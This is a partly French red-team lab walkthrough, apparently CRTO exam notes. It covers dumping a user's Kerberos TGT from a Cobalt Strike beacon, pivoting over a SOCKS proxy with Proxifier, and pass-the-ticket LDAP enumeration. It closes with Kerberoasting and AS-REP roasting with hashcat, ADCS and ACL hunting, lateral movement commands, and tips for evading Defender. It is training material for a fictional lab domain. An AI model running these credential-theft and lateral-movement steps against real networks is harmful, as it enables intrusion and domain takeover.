# Lab — Pivoting SOCKS

> **Objectif :** obtenir un ticket de service LDAP et utiliser un proxy SOCKS pour énumérer le domaine avec l’identité d’un utilisateur, sans lire directement la mémoire de LSASS.  

**Résumé du déroulement du lab :**
```
SYSTEM Beacon → krb_dump rsteel TGT → socks proxy on beacon
→ Attacker Desktop: DNS hosts → Proxifier → runas /netonly
→ Rubeus asktgs LDAP ticket → PTT → RSAT enumeration through proxy
```

## Prérequis

>`krb_triage` et `krb_dump` sont des commandes BOF disponibles après le chargement de Kerbeus-BOF dans le client Cobalt Strike.  

```
Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

## Vérifier le Beacon SYSTEM

Dans Cobalt Strike, sélectionner le Beacon de la workstation cible. Vérifier que la session possède bien les privilèges SYSTEM.

```cs
getuid
```

`OPSEC-🟢SAFE` — commande intégrée exécutée dans le thread du Beacon, sans processus enfant.

> **Pourquoi SYSTEM ?** Ce contexte permet d’interroger les tickets Kerberos de plusieurs sessions de la machine, dont la session interactive de `rsteel`. Un Beacon de moindre intégrité ne dispose pas nécessairement de ces accès.

---

### Lister les tickets Kerberos en cache

```cs
krb_triage
```

`OPSEC-🟢SAFE` dans ces notes — BOF utilisant les API Kerberos depuis le Beacon, sans lancer de processus enfant. Cette qualification ne garantit pas l’absence de télémétrie EDR.

> **Points à relever dans la sortie :**
> - Chercher l’entrée avec `User: rsteel` et `Service: krbtgt` : elle correspond au TGT.
> - Noter le LUID de session (par exemple `0x3e7`) pour identifier précisément la session de connexion.
> - Les tickets `krbtgt` sont des TGT ; les entrées `ldap` ou `cifs` sont des tickets de service.
> - Contrôler la date d’expiration du ticket, dont la durée de validité dépend de la politique Kerberos.

---

### Exporter le TGT de `rsteel`

>Exporter le TGT associé à l’utilisateur `rsteel`.  

```cs
krb_dump /user:rsteel /service:krbtgt
```

`OPSEC-🟢SAFE` dans ces notes — le BOF utilise les API Kerberos (`LsaCallAuthenticationPackage` et `KerbRetrieveEncodedTicketMessage`). La sortie contient un ticket `.kirbi` encodé en Base64.

> L’exécution directe de `mimikatz` dans le Beacon est classée `OPSEC-🔴UNSAFE`.  
>`execute-assembly Rubeus.exe dump` est classé `OPSEC-🟠CAUTION` car il emploie le mécanisme fork-and-run.  
>`krb_dump` est la méthode privilégiée dans ces notes pour le lab (`OPSEC-🟢SAFE`).

### Enregistrer le ticket encodé

Copier toute la valeur Base64 depuis la console du Beacon.  
Sur l’Attacker Desktop, la coller dans Notepad ou VS Code. Elle sera désignée par `[ENCODED TGT]` dans la suite.  

> **Conseil :** conserver la chaîne Base64 sur une seule ligne. Des retours à la ligne ajoutés lors de la copie peuvent empêcher Rubeus `asktgs` de lire le ticket.

---

## Configurer le proxy SOCKS

> **Principe :** le proxy SOCKS transporte les connexions TCP de l’Attacker Desktop vers le réseau interne via le canal C2 du Beacon. Les outils locaux peuvent ainsi joindre les services du lab à travers le tunnel.

### Démarrer le proxy SOCKS

```cs
beacon> socks 1080 socks5
```

Le port d’écoute `1080` est configuré sur le **team server**, et non directement sur l’hôte cible. Le tunnel utilise le canal C2 existant.

> **Choix du Beacon :** un proxy SOCKS ne nécessite pas systématiquement SYSTEM. Un Beacon de moindre intégrité peut suffire si sa connectivité réseau et ses permissions le permettent.

> **Ports :** `1080` est couramment utilisé pour SOCKS. Plusieurs tunnels nécessitent des ports d’écoute distincts, par exemple `1081` et `1082`.

❗ La configuration du proxy peut ensuite être utilisée depuis les outils locaux ❗  

---

## Résolution DNS depuis l’Attacker Desktop

> **Pourquoi :** l’Attacker Desktop étant hors domaine, son DNS ne résout pas nécessairement les noms internes comme `lon-dc-1` et `contoso.com`. La résolution de noms doit être correcte pour les échanges Kerberos du lab.

### Ajouter les entrées dans le fichier hosts

💡  Ouvrir un terminal **en administrateur** sur l’Attacker Desktop 💡  pour modifier `drivers\etc\hosts`💡  

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

## Configurer Proxifier

> **Rôle de Proxifier :** certains outils Windows comme Rubeus et les cmdlets RSAT ne prennent pas directement en charge SOCKS. Proxifier redirige leurs connexions TCP vers le proxy défini dans ses règles.

### Ouvrir Proxifier

Ouvrir **Proxifier** depuis le menu Démarrer de Windows, puis sélectionner son icône dans la zone de notification si la fenêtre est réduite.

---

### Définir le serveur proxy

**Profile → Proxy Servers → Add**

| Champ    | Valeur              |
|----------|--------------------|
| Address  | `10.0.0.5`         |
| Port     | `1080`             |
| Protocol | SOCKS Version 5    |

Cliquer sur **OK**.

> Lorsque la fenêtre propose d’utiliser ce proxy par défaut, choisir **No** pour conserver un routage limité aux règles définies.

Cliquer de nouveau sur **OK**.

> Lorsque Proxifier propose de modifier les règles, choisir **Yes**.

---

### Configurer les règles de Proxification

Ajouter une règle :

| Field        | Value                        |
|--------------|------------------------------|
| Nom          | `Beacon`                     |
| Hôtes cibles | `10.10.120.0/23`             |
| Ports cibles | `Any`                        |
| Action       | Proxy SOCKS5 10.0.0.5        |

<img src="/images/Proxification-Rules-target-hosts-network-subnet-proxychains.png">  

Click **OK** → **OK**.

> **Why `/23`?** The CONTOSO lab environment spans `10.10.120.0/23` (covers `.120.x` and `.121.x` subnets). Adjust the CIDR to match the actual target range shown in your lab environment. Routing only the target subnet prevents all Attacker Desktop traffic from going through the beacon.

> **Rule ordering matters:** Proxifier evaluates rules top-to-bottom. The default `Direct` rule must be below your `Beacon` rule, or it will short-circuit and traffic will go direct (failing to reach internal hosts).

---

## Phase 5 — LDAP Service Ticket

> **Why two steps (runas + asktgs)?** Kerberos tickets are session-bound. To use rsteel's TGT, you need a logon session on the Attacker Desktop that is configured for the CONTOSO domain context. `runas /netonly` creates a new process with a Type 9 network logon session (credentials used only for network auth, not local). The password is irrelevant — you will immediately overwrite the Kerberos state by injecting the real TGT via `asktgs /ptt`.

### Step 1 — Create a CONTOSO Network Logon Session

In an existing Terminal window (does not need to be admin), run:

```powershell
runas /netonly /user:CONTOSO\rsteel powershell.exe
```

When prompted for password, enter any string (e.g., `FakePass`). The password is not validated against the domain for `/netonly` sessions — the credential is stored for later network authentication challenges, but we will override it with a Kerberos ticket before making any network calls.

> A new PowerShell window opens running as `CONTOSO\rsteel` network context. All subsequent Rubeus and RSAT commands run in **this new window**.

---

### Step 2 — Request LDAP Service Ticket and Inject (PTT)

In the **new PowerShell window** (the runas one):

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

Replace `[ENCODED TGT]` with the full base64 blob saved in Phase 1.

> 1. Rubeus sends a `TGS-REQ` to `lon-dc-1` (through the SOCKS proxy via Proxifier) using rsteel's TGT.
> 2. The DC validates the TGT, issues an LDAP service ticket (`TGS-REP`) for `ldap/lon-dc-1` encrypted with rsteel's session key.
> 3. `/ptt` (Pass-the-Ticket) injects the resulting service ticket into the current logon session's Kerberos cache — no kirbi file written to disk.
>
> **OPSEC note (attacker desktop):** Rubeus runs locally on the Attacker Desktop (your own controlled machine), not on a target. 
> Defender on the Attacker Desktop may flag `Rubeus.exe` by name or by assembly signature. If Defender is active on the dev box:
> - Rename `Rubeus.exe` to a neutral name (e.g., `svc_helper.exe`)
> - Or add a Defender exclusion for `C:\Tools\` (already done in CRTO lab environment)
> - In a real engagement, compile a custom Rubeus build with modified class/namespace names
>
> **Why not request the ticket from inside the beacon?**
> Requesting the TGS from inside the beacon would place the ticket in the beacon's session on the **target** host. We need the ticket in a session on the **Attacker Desktop** so that RSAT cmdlets running locally can use it through the proxy. The `asktgs` approach places the ticket exactly where we need it.

---

### Step 3 — Verify Ticket Injection

`klist` (native Windows command) will not show tickets in a `/netonly` session. Use Rubeus instead:

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **Expected output:** Entry for `ldap/lon-dc-1 @ CONTOSO.COM` with a valid expiry time. If the ticket is missing, recheck:
> - The base64 blob has no embedded newlines
> - The `/dc:` flag points to a hostname that resolves (check Step 3 of Phase 3)
> - Proxifier rule covers `10.10.120.0/23` and the DC IP is in that range

---

## Phase 6 — Domain Enumeration via SOCKS

> **Why RSAT cmdlets instead of SharpHound/BloodHound here?** This lab demonstrates that with a valid Kerberos ticket and a SOCKS proxy you can use **native, signed Microsoft binaries** (no tooling on disk in the target network) to enumerate AD. This is the stealthiest enumeration path — RSAT cmdlets generate standard LDAP queries indistinguishable from a legitimate admin's workstation.

Run the following in the **runas PowerShell window** (where the LDAP ticket is cached):

```powershell
# Enumerate all computer objects
Get-ADComputer -Filter * -Server lon-dc-1

# Enumerate all user objects
Get-ADUser -Filter * -Server lon-dc-1

# Enumerate all OUs
Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
```

`OPSEC-🟢SAFE` LDAP queries arrive at the DC from the beacon's host IP (tunnelled through the SOCKS proxy). The DC sees standard LDAP bind + query operations from what it believes is rsteel's workstation. No PowerShell.exe on a **target** host, no child process, no Sysmon events on targets.

> **EXTRA exam ENUMERATION**
> ```powershell
> # SPNs (Kerberoast targets)
> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1
>
> # Groups
> Get-ADGroup -Filter * -Server lon-dc-1
> Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
>
> # Trust relationships
> Get-ADTrust -Filter * -Server lon-dc-1
>
> # GPOs
> Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
> ```

> **Lab complete.** You have demonstrated: BOF-based ticket extraction → SOCKS tunnel → Proxifier routing → Kerberos PTT → native LDAP enumeration. No raw LSASS read, no child processes on targets, no tooling dropped to disk on the target network.

---

## Troubleshooting — SOCKS Proxy Dead

> **Symptom:** Proxifier logs show `error: Could not connect through proxy 10.0.0.5:1080 - Reading proxy reply on a connection request timed out`. Previously working connections start failing mid-session.

**Root cause:** The SOCKS listener runs inside the beacon thread. If the beacon stops calling home (dead, sleeping, or network disruption), the tunnel stalls and all proxy connections time out. The Proxifier side appears healthy — the failure is on the team server end.

### Step 1 — Diagnose: Beacon alive or dead?

Check the CS UI — look at the beacon's last callback timestamp.

- **Last callback recent (within sleep+jitter window)** → beacon alive, socks process dropped → restart it
- **Last callback stale / beacon greyed out** → beacon dead → re-establish

### Step 2a — Beacon alive: Restart the SOCKS listener

```cs
beacon> socks stop
beacon> socks 1080 socks5
```

Then re-test in Proxifier by re-running any RSAT command. Connection should succeed immediately.

### Step 2b — Beacon dead: Re-establish via persistence

```cs
// Option 1 — COM hijack (Teams DLL) — triggers when Teams next starts on the target
// Option 2 — WMI subscription — trigger manually via gpupdate from another session
// Option 3 — Re-run initial access vector (ngentask/AppDomainHijack) if no persistence deployed
```

If the beacon was the only foothold and no persistence was pre-deployed, you must re-run the initial compromise vector before the SOCKS proxy can be restored.

### Prevention — Lower sleep before SOCKS-heavy work

Heavy LDAP queries (BloodHound, mass RSAT enumeration) can stall a sleeping beacon because the proxy blocks waiting for beacon callback. Drop sleep to interactive before starting:

```cs
beacon> sleep 0          // interactive — constant callback, no sleep delay
// ... run your SOCKS-dependent enumeration ...
beacon> sleep 3000 20    // restore: 3s sleep, 20% jitter
```

> `OPSEC-🟠CAUTION` — `sleep 0` beacons continuously and is significantly noisier. Use only for the duration of the proxy task window, then restore immediately.


Port `9389` is the AD Web Services port used by RSAT cmdlets (ADWS — alternative to port 389 LDAP). Timeouts on this port mean RSAT cmdlets are failing silently or hanging.

---

## Post-Lab — Next Steps on Exam Day

> Once the SOCKS proxy is established and initial LDAP enumeration is complete, the following is the standard attack progression. Work top-to-bottom — each step informs the next.

### 1. Dump live user TGTs from the foothold `OPSEC-🟢SAFE`

`krb_triage` will show every user currently logged into the compromised host. Any live TGT is a free lateral movement ticket — dump them before moving on.

```cs
beacon> krb_triage                               // identify all live sessions
beacon> krb_dump /user:pchilds /service:krbtgt   // example: second user logged in
beacon> krb_dump /user:<anyuser> /service:krbtgt
```

Save every TGT blob. They expire in 10h — prioritise using them before rotating to other techniques.

### 2. Enumerate group memberships `OPSEC-🟢SAFE`

```powershell
# In runas PowerShell window (LDAP ticket in session)
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Enterprise Admins" -Server lon-dc-1 -Recursive
Get-ADGroupMember "Remote Management Users" -Server lon-dc-1
Get-ADGroupMember "Remote Desktop Users" -Server lon-dc-1

# Check specific users found in enumeration
Get-ADPrincipalGroupMembership <username> -Server lon-dc-1
```

If any live TGT user (from step 1) is in a privileged group → immediate DA path via that ticket.

### 3. Confirm SPNs before Kerberoasting `OPSEC-🟢SAFE`

Never roast blind — enumerate SPNs first to avoid honeypot accounts and identify real targets.

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet -Server lon-dc-1 | Select SamAccountName,ServicePrincipalName,PasswordLastSet
```

> If `oracle_svc` or `mssql_svc` return **no SPN** (Rubeus reports "No results returned by LDAP"), the accounts are not Kerberoastable via standard method. Pivot to AS-REP roasting check immediately.

### 4. Kerberoast targeted SPNs `OPSEC-🟠CAUTION`

Roast only confirmed targets — one account at a time:

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:oracle_svc /nowrap
```

Send hashes to Kali for offline cracking:

```bash
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 5. AS-REP Roasting check `OPSEC-🟠CAUTION`

Run if Kerberoasting yields no SPNs, or as a parallel check:

```powershell
# Check flag directly via RSAT
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth -Server lon-dc-1
```

If any hit:

```cs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<account> /format:hashcat /nowrap
```

```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 6. ADCS check — investigate Certificate Services hosts `OPSEC-🟢SAFE`

Any host named `*-CS-*` or `*-CA-*` in the computer list is a high-priority ADCS target. Confirm via LDAP:

```powershell
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=contoso,DC=com" -Properties * -Server lon-dc-1 | Select Name,dNSHostName

# List templates — look for ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) flag
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,Name -Server lon-dc-1 | Select Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag
```

If ADCS confirmed → Certify.exe to find ESC1–ESC8 vulnerabilities is the next module path.

### 7. ACL enumeration — find delegation paths `OPSEC-🟠CAUTION`

```cs
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "rsteel|pchilds|dyork"} | Select ObjectDN,ActiveDirectoryRights,IdentityReferenceName
```

Looking for: `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChangePassword`, `WriteOwner` on any user/computer/OU — these are direct DA paths without needing to crack a hash.

### 8. Lateral movement — priority order

Once you have credentials or a usable ticket:

```cs
// Always impersonate first
beacon> steal_token <pid>                           // OPSEC-🟢SAFE — preferred
beacon> kerberos_ticket_use <path-to.kirbi>         // inject a dumped TGT

// Then move — in OPSEC preference order
beacon> jump winrm64 <target> smb                   // OPSEC-🟢SAFE — first choice
beacon> jump scshell64 <target> smb                 // OPSEC-🟠CAUTION — no Event 7045
beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — no service
beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — last resort only

beacon> rev2self                                    // drop token after move succeeds
```
